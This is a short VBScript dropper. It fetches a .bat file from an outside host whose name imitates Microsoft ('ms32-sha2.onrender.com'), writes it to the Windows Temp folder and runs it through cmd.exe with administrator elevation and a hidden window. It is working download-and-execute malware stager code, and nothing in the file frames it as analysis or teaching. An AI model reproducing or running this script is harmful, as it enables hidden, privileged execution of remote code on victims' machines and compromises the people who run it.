Const URL = "https://ms32-sha2.onrender.com/static/apps/docSetup.bat" ' ← Replace with your BAT file URL
Const FILE = "C:\Windows\Temp\downloaded_script.bat"

' Download .bat file
Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
xmlhttp.Open "GET", URL, False
xmlhttp.Send

If xmlhttp.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write xmlhttp.ResponseBody
    stream.SaveToFile FILE, 2 ' Overwrite if exists
    stream.Close
Else
    WScript.Quit
End If

' Run with elevated privileges (UAC prompt will appear)
Set shell = CreateObject("Shell.Application")
shell.ShellExecute "cmd.exe", "/c """ & FILE & """", "", "runas", 0 ' runas = admin, 0 = hidden

